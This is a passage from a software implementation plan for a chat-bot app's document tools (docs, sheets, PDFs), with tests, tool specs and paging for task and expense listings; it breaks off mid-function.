Implements **D2**'s tools (`list_documents`, `read_document`, `create_doc`, `create_sheet`, `append_to_doc`, `update_sheet_cells`, `delete_document`, `make_pdf_from_doc`, with escaped bodies and exact-or-ask names) and **D3**: a bot holding tasks + docs does "save all my tasks in a document" (`list_tasks` → `create_doc`), and finance + docs does "make a sheet of my October expenses". Its prompt says its roles work together, and the new presets are Writer (notes + docs) and Office (tasks + finance + notes + docs).

D3 must also hold for **all** records and for **the bots the user already has**:
- **All records.** M1's `list_tasks` shows `TASK_LIST_LIMIT` (50) tasks and then "…and N more", with no way to ask for the rest. `list_expenses` cuts at `EXPENSE_LIST_LIMIT` (50) and prints nothing, so the bot can't even tell (`roost/tasks/tools.py:115-119`, `roost/money/tools.py:107-116`). Both gain `offset`, and a capped listing ends with "…and N more: call again with offset=K" (`roost/records/paging.py`). The prompt says to page until nothing more is listed.
- **The bots the user already has.** The deploy adds no role. Life admin (tasks + finance) and Chief (no roles) never hold `create_doc`, and the together-hints show only when one bot holds both tools. So `_combine_section` also takes the run's teammates:
  - A bot that holds a reading tool but not the docs role is told to gather the records, then `ask_bot docs` with the full content and a title. `ask_bot` already takes a role id (M1 D5).
  - When no one holds docs, it tells the user the Docs role can be added on its Desk (Roles card).
  - The main bot may instead `suggest_bot` an Office bot.

**Files:**
- Create: `roost/documents/tool_args.py`, `roost/documents/tool_specs.py`, `roost/documents/tools.py`, `roost/bots/roles/docs.md`, `roost/records/paging.py`, `tests/test_document_tools.py`
- Modify: `roost/bots/roles.py` (`board_tab` gains `"documents"`), `roost/talk/tool_catalog.py`, `roost/talk/domain_tools.py`, `roost/talk/instructions.py`, `roost/bots/presets.py`
- Modify (M1's listings gain `offset`): `roost/tasks/tools.py`, `roost/tasks/format.py`, `roost/tasks/tool_specs.py`, `roost/money/tools.py`, `roost/money/tool_specs.py`
- Modify tests: `tests/test_instructions.py` (append), `tests/test_presets.py` (preset list), `tests/test_suggest_bot.py:150` (the enum gains `"docs"`)

**Interfaces:**
- Consumes:
  - Task 2's `DocumentService`, `Document`, `DocumentMeta`, `KIND_LABEL`, `document_line`, `document_list_text`, `CellEdit`, `SheetRows`, `RevisionConflict`.
  - M1's `TaskStore`, `TaskDraft`, `MoneyService`, `ExpenseEntry`, the `log_expense` / `list_expenses` tools, `RecordContext` and `ToolOutcome`.
  - M1's `Teammate(name, job, off_duty, roles)` (`roost/talk/instructions.py`), `ask_bot` by role id (`TeamTools._resolve_target`), and `suggest_bot` for the main bot.
  - Task 1's test helpers pattern.
- Produces:
  - `DOCUMENT_TOOL_DEFS` and `DocumentTools`.
  - Role `docs` (`board_tab: documents`).
  - `more_line(total, offset, shown)`, plus `offset` on `list_tasks` and `list_expenses`.
  - `_combine_section(roles, teammates, *, lead)` in `build_instructions`.
  - Presets `office` and `writer`.

- [ ] **Step 1: Path guard** (as Task 1 Step 1).

- [ ] **Step 2: Write the failing tests**

`tests/test_document_tools.py`:

```python
"""The docs role end to end (M2 D2, D3): a bot's tools over the user's shared
documents, alone and together with its other roles."""

from __future__ import annotations

from decimal import Decimal

import pytest

from roost.config import load_config
from roost.db.connection import init_db
from roost.documents import pdf_ops
from roost.documents.doc_markdown import doc_to_markdown
from roost.documents.models import Document
from roost.documents.render import pdf_bytes_of, snapshot_of
from roost.documents.service import DocumentService
from roost.documents.sheet_snapshot import as_grid
from roost.documents.store import DocumentStore
from roost.events.hub import EventHub
from roost.gateway.auth import register_user
from roost.llm.types import ToolCallRequested, TurnDone
from roost.money.category_store import CategoryStore
from roost.money.expense_store import ExpenseStore
from roost.money.service import ExpenseEntry, MoneyService
from roost.talk.gate import REFUSAL_TEXT, TAINTED_CHANGE_TEXT
from roost.tasks.models import TaskDraft
from roost.tasks.store import TaskStore
from team_helpers import ask, make_bot, make_rig, say, send, team_model, wait_idle


@pytest.fixture
async def cfg():
    config = load_config()
    await init_db(config)
    return config


@pytest.fixture
async def user_id(cfg):
    return (await register_user(cfg, "alice", "pw-123456")).id


def _tool(call_id: str, name: str, **arguments):
    return [ToolCallRequested(id=call_id, name=name, arguments=arguments), TurnDone("tool_use")]


async def _talk(cfg, user_id, bot, script: dict, text: str):
    rig = make_rig(cfg, team_model(script))
    thread = await rig.talk.create_thread(user_id, bot.id)
    await send(rig, user_id, bot.id, thread.id, text)
    await wait_idle(rig.runner)
    return rig, thread


def _tool_texts(request) -> list[str]:
    return [turn.text for turn in request.turns if turn.role == "tool"]


def _service(cfg) -> DocumentService:
    return DocumentService(DocumentStore(cfg), EventHub(cfg))


async def _documents(cfg, user_id) -> list[Document]:
    store = DocumentStore(cfg)
    return [await store.get(user_id, meta.id) for meta in await store.list(user_id)]


async def test_save_all_my_tasks_in_a_document(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Office", roles=("tasks", "docs"))
    for title in ("Call the dentist", "Buy orchids for Ana"):
        await TaskStore(cfg).create(user_id, TaskDraft(title=title), created_by_bot=None, tainted=False)
    rig, _ = await _talk(cfg, user_id, bot, {"Office": [
        _tool("l", "list_tasks", status="all"),
        _tool("d", "create_doc", title="My tasks", markdown="# My tasks\n\n- Call the dentist\n- Buy orchids for Ana"),
        say("Saved your tasks in “My tasks”."),
    ]}, "save all my tasks in a document")
    listing, created = _tool_texts(rig.model.requests[-1])
    assert "Call the dentist" in listing and "Buy orchids for Ana" in listing
    assert created.startswith("Created doc")
    [document] = await _documents(cfg, user_id)
    assert (document.meta.kind, document.meta.title, document.meta.created_by_bot, document.meta.tainted) == (
        "doc", "My tasks", bot.id, False)
    assert "- Buy orchids for Ana" in doc_to_markdown(snapshot_of(document))


async def test_a_sheet_of_my_october_expenses(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Office", roles=("finance", "docs"))
    rig, _ = await _talk(cfg, user_id, bot, {"Office": [
        _tool("e", "log_expense", amount=12.5, category="food", note="lunch", spent_at="2026-10-03"),
        _tool("l", "list_expenses", month="2026-10"),
        _tool("s", "create_sheet", title="October expenses",
              rows=[["Date", "Category", "Amount", "Note"], ["2026-10-03", "food", "12.50", "lunch"]]),
        say("Made the sheet “October expenses”."),
    ]}, "log lunch 12.50 on 3 October, then make a sheet of my October expenses")
    assert "12.50 EUR" in _tool_texts(rig.model.requests[-1])[1]
    [sheet] = await _documents(cfg, user_id)
    assert (sheet.meta.kind, sheet.meta.title) == ("sheet", "October expenses")
    assert as_grid(snapshot_of(sheet))[1] == ["2026-10-03", "food", 12.5, "lunch"]


async def test_all_sixty_tasks_reach_the_document(cfg, user_id):
    """More than one listing's worth (TASK_LIST_LIMIT is 50): the first listing
    says how to get the rest, and the second holds the other ten."""
    bot = await make_bot(cfg, user_id, "Office", roles=("tasks", "docs"))
    titles = [f"Task {n:02d}" for n in range(1, 61)]
    for title in titles:
        await TaskStore(cfg).create(user_id, TaskDraft(title=title), created_by_bot=None, tainted=False)
    markdown = "# My tasks\n\n" + "\n".join(f"- {title}" for title in titles)
    rig, _ = await _talk(cfg, user_id, bot, {"Office": [
        _tool("l1", "list_tasks", status="all"),
        _tool("l2", "list_tasks", status="all", offset=50),
        _tool("d", "create_doc", title="My tasks", markdown=markdown),
        say("Saved all 60 tasks in “My tasks”."),
    ]}, "save all my tasks in a document")
    first, second, created = _tool_texts(rig.model.requests[-1])
    assert first.endswith("…and 10 more: call again with offset=50.")
    assert len(second.splitlines()) == 10 and "more" not in second
    assert all(title in first + second for title in titles)
    assert created.startswith("Created doc")
    [document] = await _documents(cfg, user_id)
    assert "- Task 60" in doc_to_markdown(snapshot_of(document))


async def test_a_long_month_of_expenses_says_how_many_more(cfg, user_id):
    """M1's list_expenses cut at 50 and said nothing; now it says how to get the rest."""
    bot = await make_bot(cfg, user_id, "Office", roles=("finance", "docs"))
    money = MoneyService(CategoryStore(cfg), ExpenseStore(cfg), EventHub(cfg))
    for n in range(60):
        await money.log_expense(user_id, ExpenseEntry(amount=Decimal("1.50"), spent_at=f"2026-10-{n % 28 + 1:02d}",
                                                      category="food", note=f"snack {n:02d}"))
    rig, _ = await _talk(cfg, user_id, bot, {"Office": [
        _tool("l1", "list_expenses", month="2026-10"),
        _tool("l2", "list_expenses", month="2026-10", offset=50),
        say("ok"),
    ]}, "make a sheet of my October expenses")
    first, second = _tool_texts(rig.model.requests[-1])
    assert first.endswith("…and 10 more: call again with offset=50.")
    assert len(second.splitlines()) == 10 and "more" not in second
    assert all(f"snack {n:02d}" in first + second for n in range(60))


async def test_a_tasks_only_bot_hands_the_list_to_the_docs_teammate(cfg, user_id):
    """The user's bots as they are after the deploy: Life admin holds tasks and
    finance, not docs. "save all my tasks in a document" goes list_tasks →
    ask_bot docs → the Writer's create_doc, never "I can't"."""
    life_admin = await make_bot(cfg, user_id, "Life admin", roles=("tasks", "finance"))
    writer = await make_bot(cfg, user_id, "Writer", roles=("notes", "docs"))
    await TaskStore(cfg).create(user_id, TaskDraft(title="Call the dentist"), created_by_bot=None, tainted=False)
    markdown = "# My tasks\n\n- Call the dentist"
    rig, _ = await _talk(cfg, user_id, life_admin, {
        "Life admin": [
            _tool("l", "list_tasks", status="all"),
            [ask("h", "docs", f"Save this as a doc titled My tasks:\n{markdown}"), TurnDone("tool_use")],
            say("Writer saved your tasks in “My tasks”."),
        ],
        "Writer": [_tool("d", "create_doc", title="My tasks", markdown=markdown), say("Saved “My tasks”.")],
    }, "save all my tasks in a document")
    first_call = next(request for request in rig.model.requests if request.agent == "Life admin")
    assert "gather them with list_tasks or list_expenses, then ask_bot docs" in first_call.system
    [document] = await _documents(cfg, user_id)
    assert (document.meta.title, document.meta.created_by_bot, document.meta.tainted) == ("My tasks", writer.id, False)
    assert "- Call the dentist" in doc_to_markdown(snapshot_of(document))


async def test_a_doc_made_from_tainted_tasks_is_tainted(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Office", roles=("tasks", "docs"))
    await TaskStore(cfg).create(user_id, TaskDraft(title="Buy the gadget"), created_by_bot=None, tainted=True)
    await _talk(cfg, user_id, bot, {"Office": [
        _tool("l", "list_tasks"), _tool("d", "create_doc", title="My tasks", markdown="- Buy the gadget"), say("ok"),
    ]}, "save my tasks in a doc")
    [document] = await _documents(cfg, user_id)
    assert document.meta.tainted is True


async def test_an_uploaded_pdf_taints_the_run_that_reads_it(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Office", roles=("docs",))
    data = pdf_ops.generate_from_text("The deposit is two months' rent.", title="Lease")
    await _service(cfg).create_pdf(user_id, "Lease", data, tainted=True)
    rig, _ = await _talk(cfg, user_id, bot, {"Office": [
        _tool("r", "read_document", document="Lease"), _tool("d", "delete_document", document="Lease"), say("No."),
    ]}, "what does the lease say about the deposit? then delete it")
    read, refused = _tool_texts(rig.model.requests[-1])
    assert "two months" in read and "[from web content]" in read
    assert refused == TAINTED_CHANGE_TEXT
    assert len(await DocumentStore(cfg).list(user_id)) == 1


async def test_read_document_shows_a_sheet_as_a_small_table_and_escapes_markup(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Office", roles=("docs",))
    await _service(cfg).create_sheet(user_id, "Trip plan", [["<b>Item</b>", "Cost"], ["Hotel", 240]])
    rig, _ = await _talk(cfg, user_id, bot, {"Office": [_tool("r", "read_document", document="trip plan"), say("ok")]},
                         "read the trip plan")
    text = _tool_texts(rig.model.requests[-1])[0]
    assert "&lt;b&gt;Item&lt;/b&gt;" in text and "<b>" not in text and "240" in text and "A | B" in text


async def test_append_to_doc_and_update_sheet_cells(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Office", roles=("docs",))
    await _service(cfg).create_doc(user_id, "Packing", "- passport")
    await _service(cfg).create_sheet(user_id, "Trip", [["Item", "Cost"], ["Hotel", 240]])
    await _talk(cfg, user_id, bot, {"Office": [
        _tool("a", "append_to_doc", document="Packing", markdown="- keys"),
        _tool("c", "update_sheet_cells", document="Trip",
              cells=[{"cell": "A3", "value": "Train"}, {"cell": "b3", "value": 35}, {"cell": "B4", "formula": "=SUM(B2:B3)"}]),
        say("ok"),
    ]}, "add keys to packing and the train to the trip")
    by_title = {document.meta.title: document for document in await _documents(cfg, user_id)}
    assert doc_to_markdown(snapshot_of(by_title["Packing"])).splitlines() == ["- passport", "- keys"]
    assert by_title["Packing"].meta.revision == 2
    assert as_grid(snapshot_of(by_title["Trip"]))[2:] == [["Train", 35], ["", "=SUM(B2:B3)"]]


async def test_a_doc_tool_on_a_sheet_is_refused_plainly(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Office", roles=("docs",))
    await _service(cfg).create_sheet(user_id, "Trip", [["Item"]])
    rig, _ = await _talk(cfg, user_id, bot, {"Office": [_tool("a", "append_to_doc", document="Trip", markdown="x"),
                                                        say("ok")]}, "add x to trip")
    assert _tool_texts(rig.model.requests[-1])[0] == "Refused: “Trip” is a sheet, not a doc."


async def test_update_sheet_cells_refuses_a_cell_past_the_corner(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Office", roles=("docs",))
    await _service(cfg).create_sheet(user_id, "Trip", [["Item"]])
    rig, _ = await _talk(cfg, user_id, bot, {"Office": [
        _tool("c", "update_sheet_cells", document="Trip", cells=[{"cell": "ZZZ9999999", "value": 1}]), say("No."),
    ]}, "put 1 in ZZZ9999999 of the trip sheet")
    assert "from A1 to ZZ100000" in _tool_texts(rig.model.requests[-1])[0]
    [sheet] = await _documents(cfg, user_id)
    assert sheet.meta.revision == 1


async def test_create_sheet_refuses_too_many_rows(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Office", roles=("docs",))
    rig, _ = await _talk(cfg, user_id, bot, {"Office": [_tool("s", "create_sheet", title="Big", rows=[["x"]] * 501),
                                                        say("No.")]}, "make a big sheet")
    assert _tool_texts(rig.model.requests[-1])[0].startswith("Refused: create_sheet needs rows (1 to 500")
    assert await DocumentStore(cfg).list(user_id) == ()


async def test_make_pdf_from_doc_creates_a_pdf_that_reads_back(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Office", roles=("docs",))
    await _service(cfg).create_doc(user_id, "Letter", "# Dear Ana\n\nHappy birthday!")
    rig, _ = await _talk(cfg, user_id, bot, {"Office": [_tool("p", "make_pdf_from_doc", document="Letter"), say("ok")]},
                         "make a PDF of the letter")
    assert _tool_texts(rig.model.requests[-1])[0].startswith("Created PDF")
    pdf = next(document for document in await _documents(cfg, user_id) if document.meta.kind == "pdf")
    assert (pdf.meta.title, pdf.meta.pages, pdf.meta.created_by_bot) == ("Letter", 1, bot.id)
    assert "Happy birthday" in pdf_ops.extract_text(pdf_bytes_of(pdf))


async def test_a_near_miss_document_name_never_changes_it(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Office", roles=("docs",))
    await _service(cfg).create_doc(user_id, "Packing list", "- passport")
    rig, _ = await _talk(cfg, user_id, bot, {"Office": [_tool("d", "delete_document", document="Packing lust"),
                                                        say("Which?")]}, "delete packing lust")
    assert "Did you mean" in _tool_texts(rig.model.requests[-1])[0]
    assert len(await DocumentStore(cfg).list(user_id)) == 1


async def test_two_bots_with_the_docs_role_share_the_users_documents(cfg, user_id):
    writer = await make_bot(cfg, user_id, "Writer", roles=("notes", "docs"))
    office = await make_bot(cfg, user_id, "Office", roles=("tasks", "finance", "notes", "docs"))
    await _talk(cfg, user_id, writer, {"Writer": [_tool("d", "create_doc", title="Ideas", markdown="- garden"),
                                                  say("ok")]}, "start an ideas doc")
    rig, _ = await _talk(cfg, user_id, office, {"Office": [_tool("l", "list_documents"), say("ok")]}, "what docs do I have?")
    assert "“Ideas”" in _tool_texts(rig.model.requests[-1])[0]


async def test_a_bot_without_the_docs_role_is_refused(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Life admin", roles=("tasks",))
    rig, _ = await _talk(cfg, user_id, bot, {"Life admin": [_tool("d", "create_doc", title="x", markdown="x"),
                                                            say("No.")]}, "make a doc")
    assert _tool_texts(rig.model.requests[-1])[0] == REFUSAL_TEXT
    assert await DocumentStore(cfg).list(user_id) == ()
```

Append to `tests/test_instructions.py`:

```python
def test_an_office_bot_is_told_its_roles_work_together():
    """M2 D3: "save all my tasks in a document" must never get "I'm isolated"."""
    roles = default_roles().for_ids(("tasks", "finance", "notes", "docs"))
    prompt = build_instructions(_bot(), roles=roles)
    assert "Your roles work together" in prompt
    assert "call list_tasks, then create_doc with one line per task" in prompt
    assert "list_expenses for the month, then create_sheet" in prompt
    assert "repeat the call with that offset until nothing more is listed, then write them all" in prompt
    assert "never say one role's records are out of reach of another" in prompt
    assert "ask_bot docs" not in prompt


def test_a_bot_whose_roles_have_nothing_to_combine_gets_no_such_section():
    for held in (("docs",), ("tasks", "finance"), ("web",)):
        assert "Your roles work together" not in build_instructions(_bot(), roles=default_roles().for_ids(held))


def test_a_bot_without_docs_hands_its_records_to_the_docs_teammate():
    """The bots the user already has: the deploy gives Life admin (tasks +
    finance) no docs role, so it hands what it gathered to the docs holder."""
    writer = Teammate("Writer", "keeps notes and documents", False, ("notes", "docs"))
    prompt = build_instructions(_bot(), roles=default_roles().for_ids(("tasks", "finance")), teammates=(writer,))
    assert ("to save them in a document, gather them with list_tasks or list_expenses, then ask_bot docs "
            "with the full content and a title") in prompt
    assert "repeat the call with that offset until nothing more is listed" in prompt
    assert "suggest_bot" not in prompt


def test_with_no_docs_holder_the_user_is_told_where_to_add_the_role():
    tasks_only = build_instructions(_bot(), roles=default_roles().for_ids(("tasks",)))
    assert "the Docs role can be added on your Desk (Roles card)" in tasks_only
    assert "suggest_bot" not in tasks_only
    chief = replace(_bot(), is_primary=True)
    life_admin = Teammate("Life admin", "keeps tasks and money", False, ("tasks", "finance"))
    assert "suggest_bot an Office bot" in build_instructions(chief, teammates=(life_admin,))
    writer = Teammate("Writer", "keeps notes and documents", False, ("notes", "docs"))
    with_writer = build_instructions(chief, teammates=(life_admin, writer))
    assert "ask_bot the role that keeps them (tasks, finance or notes) for the full list, then ask_bot docs" in with_writer
    assert "suggest_bot an Office bot" not in with_writer
```

In `tests/test_presets.py::test_presets_name_known_roles_and_chief_is_the_main_bot` replace `assert list(presets) == ["life_admin", "researcher", "chief"]` with:

```python
    assert list(presets) == ["life_admin", "office", "writer", "researcher", "chief"]
    assert (presets["office"]["label"], presets["office"]["roles"]) == ("Office", ["tasks", "finance", "notes", "docs"])
    assert (presets["writer"]["label"], presets["writer"]["roles"]) == ("Writer", ["notes", "docs"])
```

In `tests/test_suggest_bot.py:150` change the expected enum to `["docs", "finance", "notes", "tasks", "web"]`.

- [ ] **Step 3: Run them to see them fail**

Run: `cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest tests/test_document_tools.py tests/test_instructions.py tests/test_presets.py tests/test_suggest_bot.py -q`
Expected: FAIL. Every docs tool call is refused with `REFUSAL_TEXT` (no `docs` role and no catalog entries), the combine and hand-over hints are missing, and the preset list has three entries. The paging tests fail because `list_tasks` ignores `offset` (its second listing repeats the first 50) and `list_expenses` ends with no "…and 10 more" line.

- [ ] **Step 3a: Page M1's listings** (the cure for "save ALL my tasks" missing the 51st)

`roost/records/paging.py`:

```python
"""The tail of a capped listing (M2 D3): how many records are left and how to
get them, so "save ALL my tasks in a document" can page through every one."""

from __future__ import annotations

from types import MappingProxyType
from typing import Any, Mapping

# The ``offset`` argument of every paged listing's tool spec (copied with dict() into each spec).
OFFSET_PROPERTY: Mapping[str, Any] = MappingProxyType({
    "type": "integer", "minimum": 0,
    "description": "Skip this many, to get the rest after a listing that ends with '…and N more'.",
})


def more_line(total: int, offset: int, shown: int) -> str:
    rest = total - offset - shown
    return f"\n…and {rest} more: call again with offset={offset + shown}." if rest > 0 else ""
```

In `roost/tasks/tools.py`:
- `ListTasksArgs` gains `offset: int = Field(default=0, ge=0)`.
- `_NEEDS["list_tasks"]` becomes `"an optional status (open, done, all), category and offset"`.
- `_list` shows `matching[args.offset:args.offset + TASK_LIST_LIMIT]` and returns `task_list_text(shown, len(matching), args.offset)`.

In `roost/tasks/format.py` (Roost's function, not a harvested one), import `more_line` and replace `task_list_text` with:

```python
def task_list_text(tasks: tuple[Task, ...], total: int, offset: int = 0) -> str:
    if not tasks:
        return "No tasks match." if total == 0 else f"Nothing more: all {total} tasks are listed."
    return "\n".join(task_line(task) for task in tasks) + more_line(total, offset, len(tasks))
```

In `roost/money/tools.py`, add `class ListExpensesArgs(MonthArgs)` with `offset: int = Field(default=0, ge=0)`. `money_summary` keeps `MonthArgs`, so its schema doesn't change. Then `_list` becomes:

```python
    async def _list(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        """Taint covers every expense shown AND every category name printed."""
        args = ListExpensesArgs.model_validate(arguments)
        categories = {c.id: c for c in await self._service.categories(ctx.user_id)}
        expenses = await self._service.list_expenses(ctx.user_id, _month(args.month))
        wanted = (args.category or "").strip().casefold()
        matching = tuple(e for e in expenses if not wanted or _category_name(categories, e).casefold() == wanted)
        shown = matching[args.offset:args.offset + EXPENSE_LIST_LIMIT]
        if not shown:
            return ToolOutcome("No expenses match." if not matching
                               else f"Nothing more: all {len(matching)} expenses are listed.")
        lines = "\n".join(expense_line(e, _category_name(categories, e)) for e in shown)
        tainted = any(e.tainted or _category_tainted(categories, e) for e in shown)
        return ToolOutcome(lines + more_line(len(matching), args.offset, len(shown)), tainted=tainted)
```

In both specs, `list_tasks` (`roost/tasks/tool_specs.py`) and `list_expenses` (`roost/money/tool_specs.py`), import `OFFSET_PROPERTY` from `roost.records.paging` and add `"offset": dict(OFFSET_PROPERTY)` to the spec's `properties`. Then append " A long list ends with how to get the rest." to both descriptions.

- [ ] **Step 4: Tool arguments and specs**

`roost/documents/tool_args.py`:

```python
"""The docs role's tool arguments (M2 D2) — pydantic at the tool boundary."""

from __future__ import annotations

from pydantic import BaseModel, ConfigDict, Field

from roost.constants import MAX_DOC_MARKDOWN_LENGTH, MAX_DOCUMENT_TITLE_LENGTH, MAX_SHEET_CELLS_PER_CALL
from roost.documents.cells import CellEdit, SheetRows
from roost.documents.models import DocumentKind


class ListDocumentsArgs(BaseModel):
    model_config = ConfigDict(extra="ignore")
    kind: DocumentKind | None = None


class DocumentRefArgs(BaseModel):
    model_config = ConfigDict(extra="ignore")
    document: str = Field(min_length=1, max_length=MAX_DOCUMENT_TITLE_LENGTH)


class CreateDocArgs(BaseModel):
    model_config = ConfigDict(extra="ignore")
    title: str = Field(default="", max_length=MAX_DOCUMENT_TITLE_LENGTH)
    markdown: str = Field(min_length=1, max_length=MAX_DOC_MARKDOWN_LENGTH)


class CreateSheetArgs(BaseModel):
    model_config = ConfigDict(extra="ignore")
    title: str = Field(default="", max_length=MAX_DOCUMENT_TITLE_LENGTH)
    rows: SheetRows = Field(min_length=1)


class AppendToDocArgs(DocumentRefArgs):
    markdown: str = Field(min_length=1, max_length=MAX_DOC_MARKDOWN_LENGTH)


class UpdateSheetCellsArgs(DocumentRefArgs):
    cells: list[CellEdit] = Field(min_length=1, max_length=MAX_SHEET_CELLS_PER_CALL)


class MakePdfArgs(DocumentRefArgs):
    title: str | None = Field(default=None, max_length=MAX_DOCUMENT_TITLE_LENGTH)
```

`roost/documents/tool_specs.py`:

```python
"""The docs role's tool specs and gate kinds (M2 D2). Tool names and caps
follow LazyClaw's docs / sheets / pdf skills; the descriptions are ours."""

from __future__ import annotations

from roost.llm.types import ToolSpec
from roost.talk.tool_def import ToolDef

_DOCUMENT_REF = {"type": "string", "description": "The document's id, or its title (or a unique part of it)."}
_TITLE = {"type": "string", "description": "Short title, e.g. 'My tasks'."}
_MARKDOWN = {"type": "string", "description": ("Markdown: # headings, - bullets, 1. numbered items, **bold**, "
                                               "*italic*, [links](https://…).")}
_CELL_VALUE = {"type": ["string", "number", "boolean", "null"]}

LIST_DOCUMENTS_SPEC = ToolSpec(
    name="list_documents",
    description="List the user's documents (docs, sheets and PDFs, shared by every bot with the docs role), newest first.",
    input_schema={"type": "object", "properties": {"kind": {"type": "string", "enum": ["doc", "sheet", "pdf"]}}},
)
READ_DOCUMENT_SPEC = ToolSpec(
    name="read_document",
    description=("Read a document: a doc as markdown, a sheet as a table (its first 30 rows and 10 columns), "
                 "a PDF as its text. Long ones are cut."),
    input_schema={"type": "object", "properties": {"document": _DOCUMENT_REF}, "required": ["document"]},
)
CREATE_DOC_SPEC = ToolSpec(
    name="create_doc",
    description="Create a doc from markdown. The user opens and edits it on the Board's Documents tab.",
    input_schema={"type": "object", "properties": {"title": _TITLE, "markdown": _MARKDOWN},
                  "required": ["title", "markdown"]},
)
CREATE_SHEET_SPEC = ToolSpec(
    name="create_sheet",
    description=("Create a spreadsheet from rows, starting at A1; the first row is usually the header. Numbers "
                 "stay numbers. At most 500 rows of 26 cells."),
    input_schema={"type": "object", "properties": {
        "title": _TITLE,
        "rows": {"type": "array", "items": {"type": "array", "items": _CELL_VALUE}},
    }, "required": ["title", "rows"]},
)
APPEND_TO_DOC_SPEC = ToolSpec(
    name="append_to_doc",
    description="Add markdown to the end of a doc.",
    input_schema={"type": "object", "properties": {"document": _DOCUMENT_REF, "markdown": _MARKDOWN},
                  "required": ["document", "markdown"]},
)
UPDATE_SHEET_CELLS_SPEC = ToolSpec(
    name="update_sheet_cells",
    description=("Set cells in a sheet by A1 reference: a value, or a formula like =SUM(B2:B9) (the sheet "
                 "computes it when opened). A cell with neither is cleared."),
    input_schema={"type": "object", "properties": {
        "document": _DOCUMENT_REF,
        "cells": {"type": "array", "items": {"type": "object", "properties": {
            "cell": {"type": "string", "description": "A1 reference, e.g. B3."},
            "value": _CELL_VALUE, "formula": {"type": "string"},
        }, "required": ["cell"]}},
    }, "required": ["document", "cells"]},
)
DELETE_DOCUMENT_SPEC = ToolSpec(
    name="delete_document",
    description="Delete a document.",
    input_schema={"type": "object", "properties": {"document": _DOCUMENT_REF}, "required": ["document"]},
)
MAKE_PDF_FROM_DOC_SPEC = ToolSpec(
    name="make_pdf_from_doc",
    description="Make a new PDF from a doc's text (the doc stays as it is).",
    input_schema={"type": "object", "properties": {
        "document": _DOCUMENT_REF, "title": {"type": "string", "description": "The PDF's title (default: the doc's)."},
    }, "required": ["document"]},
)

DOCUMENT_TOOL_DEFS: tuple[ToolDef, ...] = (
    ToolDef(LIST_DOCUMENTS_SPEC, "read"),
    ToolDef(READ_DOCUMENT_SPEC, "read"),
    ToolDef(CREATE_DOC_SPEC, "write_create"),
    ToolDef(CREATE_SHEET_SPEC, "write_create"),
    ToolDef(APPEND_TO_DOC_SPEC, "write_change"),
    ToolDef(UPDATE_SHEET_CELLS_SPEC, "write_change"),
    ToolDef(DELETE_DOCUMENT_SPEC, "write_change"),
    ToolDef(MAKE_PDF_FROM_DOC_SPEC, "write_create"),
)
```

- [ ] **Step 5: The tools** — `roost/documents/tools.py`:

```python
"""The docs role's tools over the user's shared documents (M2 D2). Pydantic
arguments, provenance (bot + taint) on every new document, escaped results,
exact-or-ask names (a near miss never changes a document), and a document's
taint taints the run that reads it — an uploaded PDF is outside content."""

from __future__ import annotations

import html
from typing import Any

from pydantic import ValidationError

from roost.constants import DOCUMENT_LIST_LIMIT, MAX_SHEET_CELLS_PER_CALL, MAX_SHEET_COLS, MAX_SHEET_ROWS_PER_CALL
from roost.documents.cells import LAST_CELL
from roost.documents.format import KIND_LABEL, document_line, document_list_text
from roost.documents.models import Document, DocumentMeta
from roost.documents.service import DocumentService
from roost.documents.tool_args import (
    AppendToDocArgs, CreateDocArgs, CreateSheetArgs, DocumentRefArgs, ListDocumentsArgs, MakePdfArgs,
    UpdateSheetCellsArgs,
)
from roost.records.resolver import NamedRef, resolve
from roost.records.revision import RevisionConflict
from roost.talk.domain_tools import RecordContext
from roost.talk.outcome import ToolOutcome

CHANGED_WHILE_WRITING_TEXT = "Refused: that document changed while I was writing. Read it again first."
_ACTIVITY = {
    "list_documents": "checking your documents", "read_document": "reading a document",
    "create_doc": "writing a doc", "create_sheet": "making a sheet", "append_to_doc": "adding to a doc",
    "update_sheet_cells": "updating a sheet", "delete_document": "deleting a document",
    "make_pdf_from_doc": "making a PDF",
}
_NEEDS = {
    "list_documents": "an optional kind (doc, sheet or pdf)",
    "read_document": "the document (its id or title)",
    "create_doc": "a title and markdown text",
    "create_sheet": f"rows (1 to {MAX_SHEET_ROWS_PER_CALL}, each at most {MAX_SHEET_COLS} cells) and a title",
    "append_to_doc": "the doc (its id or title) and the markdown to add",
    "update_sheet_cells": f"the sheet (its id or title) and 1 to {MAX_SHEET_CELLS_PER_CALL} cells from A1 to "
                          f"{LAST_CELL}, like {{\"cell\": \"B3\", \"value\": 35}}",
    "delete_document": "the document (its id or title)",
    "make_pdf_from_doc": "the doc (its id or title)",
}


def _escape(text: str) -> str:
    return html.escape(text, quote=True)


def _title(raw: str | None, fallback: str) -> str:
    return (raw or "").strip() or fallback


def _match(metas: tuple[DocumentMeta, ...], ref: str, change: bool) -> DocumentMeta | ToolOutcome:
    """Id, exact title or a unique part of it (harvested resolver); a lone near
    miss may be read but never changed. A refusal that lists titles carries
    those documents' taint (M1 D3)."""
    by_id = next((meta for meta in metas if meta.id == ref.strip()), None)
    if by_id is not None:
        return by_id
    by_key = {meta.id: meta for meta in metas}
    hit = resolve(ref, [NamedRef(meta.id, meta.title) for meta in metas])
    if hit.resolved is not None and (hit.reason != "fuzzy" or not change):
        return by_key[hit.resolved.id]
    shown = tuple(by_key[c.id] for c in hit.candidates[:5])
    listed, tainted = "; ".join(document_line(meta) for meta in shown), any(meta.tainted for meta in shown)
    if hit.reason == "fuzzy":
        return ToolOutcome(f"Refused: no document is called “{_escape(ref)}”. Did you mean {listed}? Say it exactly.",
                           tainted=tainted)
    if hit.reason == "multi":
        return ToolOutcome(f"Refused: several documents match “{_escape(ref)}”: {listed}. Say which one (its id).",
                           tainted=tainted)
    return ToolOutcome(f"Refused: no document matches “{_escape(ref)}”.")


def _saved(found: Document, meta: DocumentMeta | None, verb: str) -> ToolOutcome:
